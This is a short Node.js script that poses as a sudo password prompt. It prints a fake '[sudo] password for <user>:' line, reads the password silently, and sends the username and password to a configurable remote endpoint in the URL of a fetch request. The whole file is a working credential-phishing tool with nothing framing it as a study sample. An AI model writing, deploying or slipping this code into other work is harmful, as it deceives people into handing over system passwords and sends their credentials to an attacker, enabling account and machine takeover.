const process = require('process')
const fetch = require('node-fetch')
const { exec } = require('child_process')
const standard_input = process.stdin
standard_input.setEncoding('utf-8')

const read = require('read')
const Options = {
	silent: true
}

// Change this to your endpoint server.
const server_url = `http://localhost:5000/api/`

const getUser = () => {
	return new Promise((resolve, reject) => {
		exec('whoami', (error, stdout, stderr) => {
			let output = '[sudo] password for ' + stdout.trim() + ':'
			output = output.replace(/^\s+|\s+$/g, '')
			console.log(output)
			return resolve(stdout)
		})
	})
}

function getPassword() {
	return new Promise((resolve, reject) => {
		read(Options, (err, pass) => {
			return resolve(pass)
		})
	})
}

async function main() {
	const user = await getUser()
	const pass = await getPassword()
	const url = `${server_url}${user.trim()}/${pass.trim()}`
	fetch(url)
		.then(response => response.json())
		.then(data => console.log(data))
		.catch(error => console.error(error))
}

main()
